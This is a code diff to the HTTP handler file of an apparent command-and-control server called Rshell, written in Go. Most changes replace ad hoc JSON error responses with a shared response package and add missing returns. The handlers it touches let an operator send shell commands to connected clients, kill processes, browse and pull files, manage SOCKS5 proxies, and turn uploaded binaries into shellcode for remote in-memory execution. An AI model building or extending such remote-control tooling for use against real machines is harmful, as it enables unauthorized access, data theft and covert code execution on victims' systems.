@@ -6,12 +6,12 @@ import (
 	"Rshell/pkg/godonut"
 	"Rshell/pkg/logger"
 	"Rshell/pkg/proxy"
+	"Rshell/pkg/response"
 	"Rshell/pkg/sendcommand"
 	"Rshell/pkg/utils"
 	"context"
 	"encoding/binary"
-	"io/ioutil"
-	"net/http"
+	"io"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -27,16 +27,16 @@ func GetClients(c *gin.Context) {
 		PageSize int `form:"page_size"`
 	}
 	if err := c.ShouldBindQuery(&clientGet); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
 		return
 	}
 	var clientData []database.Clients
 	database.Engine.Find(&clientData)
 	clientData2 := utils.Paginate(clientData, clientGet.Page, clientGet.PageSize)
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": gin.H{
+	response.OK(c, gin.H{
 		"list":  clientData2,
 		"total": len(clientData),
-	}})
+	})
 }
 func SendCommands(c *gin.Context) {
 	var commands struct {
@@ -44,7 +44,8 @@ func SendCommands(c *gin.Context) {
 		Command string `json:"command"`
 	}
 	if err := c.ShouldBindJSON(&commands); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 
 	var shellHistory database.Shell
@@ -54,7 +55,7 @@ func SendCommands(c *gin.Context) {
 
 	sendcommand.SendCommand(commands.Uid, commands.Command)
 
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": shellHistory.ShellContent})
+	response.OK(c, shellHistory.ShellContent)
 }
 
 func GetShellContent(c *gin.Context) {
@@ -62,11 +63,12 @@ func GetShellContent(c *gin.Context) {
 		Uid string `form:"uid"`
 	}
 	if err := c.ShouldBindQuery(&shellContent); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	var shell database.Shell
 	database.Engine.Where("uid = ?", shellContent.Uid).Get(&shell)
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": shell.ShellContent})
+	response.OK(c, shell.ShellContent)
 	//var body struct {
 	//	Uid string `form:"uid"`
 	//}
@@ -84,7 +86,8 @@ func GetPidList(c *gin.Context) {
 		Uid string `form:"uid"`
 	}
 	if err := c.ShouldBindQuery(&shellContent); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	// 创建 UID 对应的通道队列
 	queue := command.VarPidQueue.GetOrCreateQueue(shellContent.Uid)
@@ -99,9 +102,9 @@ func GetPidList(c *gin.Context) {
 	select {
 	case pids := <-queue:
 		pidStruct := utils.ParsePid(pids)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": pidStruct})
+		response.OK(c, pidStruct)
 	case <-ctx.Done():
-		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
+		response.Timeout(c)
 	}
 }
 func KillPid(c *gin.Context) {
@@ -110,10 +113,11 @@ func KillPid(c *gin.Context) {
 		Pid string `json:"pid"`
 	}
 	if err := c.ShouldBindJSON(&pidBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	sendcommand.SendCommand(pidBody.Uid, "kill "+pidBody.Pid)
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": "killed"})
+	response.OK(c, "killed")
 }
 func FileBrowse(c *gin.Context) {
 	var fileBody struct {
@@ -121,10 +125,12 @@ func FileBrowse(c *gin.Context) {
 		DirPath string `json:"dirPath"`
 	}
 	if err := c.ShouldBindJSON(&fileBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	if fileBody.DirPath == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "dirPath is empty"})
+		response.BadRequest(c, "dirPath is empty")
+		return
 	}
 
 	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)
@@ -142,9 +148,9 @@ func FileBrowse(c *gin.Context) {
 	select {
 	case fileBrowseStr := <-queue:
 		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
+		response.OK(c, fileTree)
 	case <-ctx.Done():
-		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
+		response.Timeout(c)
 	}
 
 }
@@ -154,9 +160,9 @@ func FileDelete(c *gin.Context) {
 		FilePath string `json:"filePath"`
 	}
 	if err := c.ShouldBindJSON(&fileBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
-	sendcommand.SendCommand(fileBody.Uid, "rm "+fileBody.FilePath)
 
 	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)
 
@@ -175,9 +181,9 @@ func FileDelete(c *gin.Context) {
 	select {
 	case fileBrowseStr := <-queue:
 		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
+		response.OK(c, fileTree)
 	case <-ctx.Done():
-		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
+		response.Timeout(c)
 	}
 }
 func MakeDir(c *gin.Context) {
@@ -186,9 +192,9 @@ func MakeDir(c *gin.Context) {
 		DirPath string `json:"dirPath"`
 	}
 	if err := c.ShouldBindJSON(&dirBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
-	sendcommand.SendCommand(dirBody.Uid, "mkdir "+dirBody.DirPath)
 
 	queue := command.VarFileBrowserQueue.GetOrCreateQueue(dirBody.Uid)
 
@@ -207,29 +213,29 @@ func MakeDir(c *gin.Context) {
 	select {
 	case fileBrowseStr := <-queue:
 		fileTree := command.ParseDirectoryString(dirBody.Uid, fileBrowseStr)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
+		response.OK(c, fileTree)
 	case <-ctx.Done():
-		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
+		response.Timeout(c)
 	}
 }
 func FileUpload(c *gin.Context) {
 	file, _ := c.FormFile("file")
 	if file == nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "No file uploaded"})
+		response.BadRequest(c, "No file uploaded")
 		return
 	}
 	// 打开上传的文件
 	src, err := file.Open()
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Unable to open file"})
+		response.InternalError(c)
 		return
 	}
 	defer src.Close()
 
 	// 读取文件内容到字节数组
-	fileBytes, err := ioutil.ReadAll(src)
+	fileBytes, err := io.ReadAll(src)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Unable to read file"})
+		response.InternalError(c)
 		return
 	}
 
@@ -260,18 +266,19 @@ func FileUpload(c *gin.Context) {
 			sendcommand.SendCommandBytes(uid, byteToSendLoop)
 		}
 	}()
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
 func GetNote(c *gin.Context) {
 	var noteBody struct {
 		Uid string `form:"uid"`
 	}
 	if err := c.ShouldBindQuery(&noteBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	var Note database.Notes
 	database.Engine.Where("uid = ?", noteBody.Uid).Get(&Note)
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": Note.Note})
+	response.OK(c, Note.Note)
 }
 func SaveNote(c *gin.Context) {
 	var noteBody struct {
@@ -279,13 +286,14 @@ func SaveNote(c *gin.Context) {
 		NoteContent string `json:"noteContent"`
 	}
 	if err := c.ShouldBindJSON(&noteBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	var Note database.Notes
 	database.Engine.Where("uid = ?", noteBody.Uid).Get(&Note)
 	Note.Note = noteBody.NoteContent
 	database.Engine.Where("uid = ?", noteBody.Uid).Update(&Note)
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
 func DownloadFile(c *gin.Context) {
 	var fileBody struct {
@@ -294,25 +302,25 @@ func DownloadFile(c *gin.Context) {
 	}
 
 	if err := c.ShouldBindJSON(&fileBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
 		return
 	}
 
 	// 验证输入参数
 	if fileBody.Uid == "" || fileBody.FilePath == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "UID and file path are required"})
+		response.BadRequest(c, "UID and file path are required")
 		return
 	}
 
 	// 验证 UID 格式
 	if strings.Contains(fileBody.Uid, "..") || strings.Contains(fileBody.Uid, "/") || strings.Contains(fileBody.Uid, "\\") {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid UID format"})
+		response.BadRequest(c, "Invalid UID format")
 		return
 	}
 
 	// 验证文件路径基本安全性
 	if fileBody.FilePath == "" || fileBody.FilePath == "." || fileBody.FilePath == ".." {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid file path"})
+		response.BadRequest(c, "Invalid file path")
 		return
 	}
 
@@ -322,7 +330,7 @@ func DownloadFile(c *gin.Context) {
 	// 确保下载目录存在
 	if err := os.MkdirAll(downloadDir, 0755); err != nil {
 		logger.Error("Failed to create download directory: %v", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create download directory"})
+		response.InternalError(c)
 		return
 	}
 
@@ -332,7 +340,7 @@ func DownloadFile(c *gin.Context) {
 	safeFileName = strings.ReplaceAll(safeFileName, "\\", "")
 
 	if safeFileName == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid file name"})
+		response.BadRequest(c, "Invalid file name")
 		return
 	}
 
@@ -341,7 +349,7 @@ func DownloadFile(c *gin.Context) {
 	exist, err := database.Engine.Where("uid = ? AND file_path = ?", fileBody.Uid, fileBody.FilePath).Get(&fileDownloads)
 	if err != nil {
 		logger.Error("Database query failed: %v", err)
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "Database error"})
+		response.InternalError(c)
 		return
 	}
 
@@ -356,7 +364,7 @@ func DownloadFile(c *gin.Context) {
 		}
 		if _, err := database.Engine.Insert(downloadRecord); err != nil {
 			logger.Error("Failed to insert download record: %v", err)
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create download record"})
+			response.InternalError(c)
 			return
 		}
 	} else {
@@ -369,14 +377,14 @@ WHERE uid = ? AND file_path = ?;
 		_, err := database.Engine.Exec(sql, 0, 0, fileBody.Uid, fileBody.FilePath)
 		if err != nil {
 			logger.Error("Failed to update download record: %v", err)
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update download record"})
+			response.InternalError(c)
 			return
 		}
 	}
 
 	// 发送下载命令
 	sendcommand.SendCommand(fileBody.Uid, "download "+fileBody.FilePath)
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
 
 type DownloadsInfo struct {
@@ -391,7 +399,8 @@ func GetDownloadsInfo(c *gin.Context) {
 		Uid string `form:"uid"`
 	}
 	if err := c.BindQuery(&downloadBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	var downloads []database.Downloads
 	database.Engine.Where("uid = ?", downloadBody.Uid).Find(&downloads)
@@ -409,7 +418,7 @@ func GetDownloadsInfo(c *gin.Context) {
 
 		result = append(result, tmpDownloadsInfo)
 	}
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": result})
+	response.OK(c, result)
 }
 func DownloadDownloadedFile(c *gin.Context) {
 	var downloadBody struct {
@@ -418,20 +427,20 @@ func DownloadDownloadedFile(c *gin.Context) {
 	}
 
 	if err := c.BindJSON(&downloadBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
 		return
 	}
 
 	// 使用通用的安全路径函数验证文件路径
 	fullPath, err := utils.GetSafeFilePath(downloadBody.Uid, downloadBody.FilePath)
 	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid file path"})
+		response.BadRequest(c, "Invalid file path")
 		return
 	}
 
 	// 检查文件是否存在
 	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
-		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
+		response.NotFound(c, "File not found")
 		return
 	}
 
@@ -454,7 +463,8 @@ func ListDrives(c *gin.Context) {
 		Uid string `form:"uid"`
 	}
 	if err := c.BindQuery(&drivesBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 
 	queue := command.VarDrivesQueue.GetOrCreateQueue(drivesBody.Uid)
@@ -470,9 +480,9 @@ func ListDrives(c *gin.Context) {
 	case fileBrowseStr := <-queue:
 		//fmt.Println("fileBrowseStr", fileBrowseStr)
 		fileTree := command.ParseDrives(drivesBody.Uid, fileBrowseStr)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
+		response.OK(c, fileTree)
 	case <-ctx.Done():
-		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
+		response.Timeout(c)
 	}
 }
 func FetchFileContent(c *gin.Context) {
@@ -481,7 +491,8 @@ func FetchFileContent(c *gin.Context) {
 		FilePath string `json:"path"`
 	}
 	if err := c.BindJSON(&contentBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 
 	queue := command.VarFileContentQueue.GetOrCreateQueue(contentBody.Uid, contentBody.FilePath)
@@ -495,9 +506,9 @@ func FetchFileContent(c *gin.Context) {
 	// 等待从通道接收 PID 列表
 	select {
 	case fileContent := <-queue:
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "content": fileContent})
+		response.OK(c, fileContent)
 	case <-ctx.Done():
-		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
+		response.Timeout(c)
 	}
 
 }
@@ -506,7 +517,8 @@ func ExitClient(c *gin.Context) {
 		Uid string `form:"uid"`
 	}
 	if err := c.BindQuery(&clientBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	sendcommand.SendCommand(clientBody.Uid, "exit")
 
@@ -528,7 +540,7 @@ func ExitClient(c *gin.Context) {
 				delete(proxy.Socks5Serve, socks5i.Socks5port)
 				proxy.MuSocks5Serve.Unlock()
 				if err != nil {
-					c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Socks5 closed failed"})
+					logger.Error("Socks5 closed failed for uid %s", clientBody.Uid)
 					return
 				}
 			}
@@ -537,7 +549,7 @@ func ExitClient(c *gin.Context) {
 		delete(command.UidFileBrowser, clientBody.Uid)
 	}()
 
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
 func AddUidNote(c *gin.Context) {
 	var noteBody struct {
@@ -545,11 +557,12 @@ func AddUidNote(c *gin.Context) {
 		Note string `json:"note"`
 	}
 	if err := c.BindJSON(&noteBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 
 	database.Engine.Where("uid = ?", noteBody.Uid).Update(&database.Clients{Note: noteBody.Note})
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
 func EditSleep(c *gin.Context) {
 	var sleepBody struct {
@@ -557,11 +570,12 @@ func EditSleep(c *gin.Context) {
 		Sleep string `json:"sleep"`
 	}
 	if err := c.BindJSON(&sleepBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	database.Engine.Where("uid = ?", sleepBody.Uid).Update(&database.Clients{Sleep: sleepBody.Sleep})
 	sendcommand.SendCommand(sleepBody.Uid, "sleep "+sleepBody.Sleep)
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
 func EditColor(c *gin.Context) {
 	var colorBody struct {
@@ -569,29 +583,30 @@ func EditColor(c *gin.Context) {
 		Color string `json:"color"`
 	}
 	if err := c.BindJSON(&colorBody); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		response.ValidationError(c, response.ParseValidationErrors(err))
+		return
 	}
 	database.Engine.Where("uid = ?", colorBody.Uid).Update(&database.Clients{Color: colorBody.Color})
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
 func ExecuteBin(c *gin.Context) {
 	file, _ := c.FormFile("file")
 	if file == nil {
-		c.JSON(200, gin.H{"status": 400, "data": "No file uploaded"})
+		response.BadRequest(c, "No file uploaded")
 		return
 	}
 	// 打开上传的文件
 	src, err := file.Open()
 	if err != nil {
-		c.JSON(200, gin.H{"status": 400, "data": "Unable to open file"})
+		response.BadRequest(c, "Unable to open file")
 		return
 	}
 	defer src.Close()
 
 	// 读取文件内容到字节数组
-	fileBytes, err := ioutil.ReadAll(src)
+	fileBytes, err := io.ReadAll(src)
 	if err != nil {
-		c.JSON(200, gin.H{"status": 400, "data": "Unable to read file"})
+		response.BadRequest(c, "Unable to read file")
 		return
 	}
 
@@ -621,7 +636,7 @@ func ExecuteBin(c *gin.Context) {
 
 		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
 		if err != nil {
-			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Unable to generate shellcode"})
+			response.BadRequest(c, "Unable to generate shellcode")
 			return
 		}
 		cmdTypeBytes := make([]byte, 4)
@@ -643,27 +658,27 @@ func ExecuteBin(c *gin.Context) {
 		byteToSend = append(cmdTypeBytes, byteToSend...)
 		sendcommand.SendCommandBytes(uid, byteToSend)
 	}
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
 
 func ExecuteLinuxScript(c *gin.Context) {
 	file, _ := c.FormFile("file")
 	if file == nil {
-		c.JSON(200, gin.H{"status": 400, "data": "No file uploaded"})
+		response.BadRequest(c, "No file uploaded")
 		return
 	}
 	// 打开上传的文件
 	src, err := file.Open()
 	if err != nil {
-		c.JSON(200, gin.H{"status": 400, "data": "Unable to open file"})
+		response.BadRequest(c, "Unable to open file")
 		return
 	}
 	defer src.Close()
 
 	// 读取文件内容到字节数组
-	fileBytes, err := ioutil.ReadAll(src)
+	fileBytes, err := io.ReadAll(src)
 	if err != nil {
-		c.JSON(200, gin.H{"status": 400, "data": "Unable to read file"})
+		response.BadRequest(c, "Unable to read file")
 		return
 	}
 
@@ -700,5 +715,5 @@ func ExecuteLinuxScript(c *gin.Context) {
 	byteToSend = append(cmdTypeBytes, byteToSend...)
 	sendcommand.SendCommandBytes(uid, byteToSend)
 
-	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	response.OK(c, nil)
 }
